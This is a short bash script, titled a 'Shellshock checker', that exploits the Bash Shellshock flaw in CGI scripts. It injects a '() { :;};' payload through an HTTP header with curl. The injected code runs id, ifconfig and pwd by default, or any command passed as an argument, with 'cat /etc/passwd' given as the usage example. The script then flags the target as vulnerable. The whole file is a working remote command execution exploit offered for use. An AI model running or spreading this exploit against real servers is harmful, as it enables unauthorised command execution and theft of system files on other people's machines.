#!/bin/bash

# Written by TZ
# Usage: shellshock.sh [URL] [Command to execute (OPTIONAL)]
bold=`tput bold`
normal=`tput sgr0`
red='\e[0;31m'
green='\e[0;32m'
NC='\e[0m' # No Color

unique='yTg8KL}dfs56'

export http_proxy="";

if [ -z "$1" ]
	then echo "
\n####### SHELLSHOCK CHECKER #########
	
Usage: ./shellshock.sh [URL] [OPTIONAL: Command to execute]

If no command specified, this script will run the following commands by default: id;ifconfig;pwd
URL should be the full path to CGI script.

Examples:

./shellshock.sh http://blah.com/cgi-bin/status.cgi
./shellshock.sh http://blah.com/cgi-bin/counter.cgi \"cat /etc/passwd\"

########################################";
	exit 1;
fi

if [ -z "$2" ]
	#then wget -U "() { :;};echo; /bin/bash -c 'id;ifconfig;pwd;echo; echo \"$unique\"'" $1 -O outputss --no-check-certificate;
	then curl -A "Mozilla/4.0" -s -H "B:() { :;}; echo; echo; /bin/bash -c 'echo \"Command: id;ifconfig;pwd;\"; id;ifconfig;pwd;echo; echo \"$unique\";'"  $1 -k -o outputss;
else
	#wget -U "() { :;};echo; /bin/bash -c '$2; echo; echo \"$unique\"';" $1 -O outputss --no-check-certificate; 
	curl -A "Mozilla/4.0" -s -H "B:() { :;}; echo; echo; /bin/bash -c 'echo \"Command: $2 \"; $2;echo; echo \"$unique\"; '"  $1 -k -o outputss;
	
fi

echo "#######################################";
echo "        SHELLSHOCK COMMAND OUTPUT      ";
echo "#######################################";

if grep -Fq "$unique" outputss
	then cat outputss | grep -v "$unique"; echo -e "${green}>> ${bold}[STATUS][VULNERABLE] !!!${normal}${NC} - $1";
else echo -e "${red}\n>> ${bold}[STATUS][NOT VULNERABLE]${normal}${NC} - $1";
fi

echo "";
echo "#######################################"; 
rm outputss;
